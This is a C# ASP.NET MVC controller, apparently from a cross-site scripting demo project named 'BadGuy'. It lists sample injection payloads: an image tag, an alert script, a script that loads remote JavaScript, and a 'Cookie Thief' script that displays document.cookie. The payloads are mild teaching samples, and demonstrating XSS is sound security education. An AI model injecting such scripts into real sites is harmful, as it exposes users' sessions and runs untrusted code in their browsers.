﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;

namespace BadGuy.Controllers
{
    public class XssController : Controller
    {
        //
        // GET: /Xss/

        public ActionResult Index()
        {
            return View();
        }

        public ActionResult InjectionValues()
        {
            var examples = new List<InjectionExample>
                               {
                                   new InjectionExample
                                       {
                                           Title = "Image Loading Example",
                                           Content = @"<img src='http://placekitten.com/200/300' />"
                                       },
                                   new InjectionExample
                                       {
                                           Title = "Simple 'Hello World' Example",
                                           Content = @"<script>alert('hello world!');</script>"
                                       },
                                   new InjectionExample
                                       {
                                           Title = "Script Loading Example",
                                           Content =
                                               @"<script>$.getScript('http://erkie.github.com/asteroids.min.js');</script>"
                                       },
                                   new InjectionExample
                                       {
                                           Title = "Cookie Thief!",
                                           Content = @"<script>alert('Sending the following cookie info to bad people:  ' + document.cookie);</script>"
                                       }
                               };

            return View(examples);
        }
    }

    public class InjectionExample
    {
        public string Title { get; set; }
        public string Content { get; set; }
    }
}
